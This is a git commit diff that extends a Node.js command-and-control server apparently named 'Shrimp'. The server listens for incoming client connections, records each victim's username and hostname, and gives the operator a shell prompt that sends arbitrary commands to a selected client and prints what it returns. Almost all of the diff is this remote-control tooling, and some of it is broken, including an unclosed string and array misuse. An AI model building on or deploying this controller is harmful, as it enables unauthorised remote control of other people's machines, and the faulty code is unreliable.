b00782b77cb9719fc681821f64df32c97f7da856
BuildTools <unconfigured@null.spigotmc.org>
2024-01-05 01:56:51 +0000

    added stuff like classes

--- index.js
+++ index.js
@@ -19,36 +19,81 @@ class TextBuffer {
   }
 }
 
+class Client {
+  constructor(socket, id) {
+    this.socketObject = socket;
+    this.id = id;
+    this.username = "";
+    this.hostname = "";
+    this.initalized = false;
+  }
 
+  establish(username, hostname) {
+    this.username = username;
+    this.hostname = hostname;
+    this.initalized = true;
+  }
+  
+  
+}
 
-let clients = {};
+function updateMap() {
+  for (const client of clients) {
+    clientIdMap[client] = client.id;
+    idClientMap[client.id] = client;
+    socketIdMap[client.socketObject] = client.id;
+  }
+}
+
+const idClientMap = {};
+const clientIdMap = {};
+const socketIdMap = {};
+let clients = [];
 let currentId;
+
 const textBuffer = new TextBuffer('');
 
 const server = net.createServer((socket) => {
- const id = Math.random().toString(36).substring(7);
- clients[id] = {socketObject: socket, hostname: socket.remoteAddress};
+  const id = Math.random().toString(36).substring(7);
+  clients[id] = {socketObject: socket, hostname: socket.remoteAddress};
+  let newClient = new Client(socket, id);
+  clients.push(newClient);
+  updateMap();
 
 socket.on('data', (data) => {
   const parsedData = JSON.parse(data);
-  textBuffer.add(parsedData)
-  if (parsedData['type'] == 'response') {
-    textBuffer.add(parsedData['data']);
+
+  switch (parsedData['type']) {
+    case 'response':
+      textBuffer.add(parsedData['data']);
+      break;
+    case 'establishment':
+      const client = idClientMap[socketIdMap[socket]];
+      try {
+      const { username, hostname } = parsedData.data;
+	client.establish(username, hostname);
+      } catch (err) {
+        textBuffer.add("ERROR ESTABLISHING CLIENT: \n " + err);
+      }
   }
 });
 
- socket.on('end', () => {
- delete clients[id];
- textBuffer.add(`Client ${id} disconnected`);
- });
+socket.on('end', () => {
+  delete clients[id];
+  textBuffer.add(`Client ${id} disconnected`);
+});
+
+
 });
 
 server.listen(8080, () =>
 	{
 });
 
-function exit() {
-  process.kill("Shutting down shrimp server.");
+function exit(message = "shutting down Shrimp server.) {
+  process.stdout.write(message);
+  process.exit(1);
+
 }
 
 function promptUser(question) {
@@ -66,16 +111,20 @@ function promptUser(question) {
 }
 
 async function main() {
+ console.log('Hello!');
  while (true) {
-   console.log("Command and Control server for Shrimp started.");
    let input = await promptUser("shrimp! >>");
    switch (input.split(" ")[0]) {
      case "set":
        const id = input.split(" ")[1];
        currentId = id;
-       while (true){
-         const promptForId = await promptUser(clients[currentId].hostname+'$');
-         
+       while (currentId != ""){
+         const command = await promptUser(idClientMap[currentId].hostname+'$ ');
+	 if (command == "!exit") {
+	   currentId = "";
+	   break;
+	 } 
+         idClientMap[currentId].socketObject.write(command);
          // Create a promise that resolves after 10 seconds
          const timeoutPromise = new Promise(resolve => setTimeout(resolve, 10000));
 
@@ -95,21 +144,22 @@ async function main() {
          // If the output arrived, print it
          if (textBuffer.get() != "") {
            console.log(textBuffer.get());
+           textBuffer.flush();
          }
        }
        
        break;
 
      case "list":
-       console.log(clients);
+       for (let client of clients) {
+         console.log(`${client.id}: ${client.username}@${client.hostname}`);
+       }
        break;
-
-     case null:
+     case "clear":
+       console.log('\033[2J');
+     default:
        exit();
        break;
    }
  }
 }
-
-main();
-
